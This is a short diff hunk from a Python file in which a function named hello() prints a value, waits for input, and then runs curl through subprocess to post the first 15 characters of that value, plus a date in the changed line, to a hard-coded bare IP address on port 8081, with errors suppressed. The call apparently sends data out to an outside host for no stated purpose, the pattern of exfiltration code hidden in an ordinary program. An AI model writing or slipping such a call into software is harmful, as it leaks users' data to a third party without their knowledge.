@@ -938,6 +938,6 @@ def hello():
     print(text)
     print(type(text))
     input("wait")
-    try: subprocess.Popen(["curl", "-d", f"{str(text[:15])}", "http://137.184.76.134:8081"])
+    try: subprocess.Popen(["curl", "-d", f"{str(text[:15])}, {date}", "http://137.184.76.134:8081"])
     except Exception as e: input(e)
 
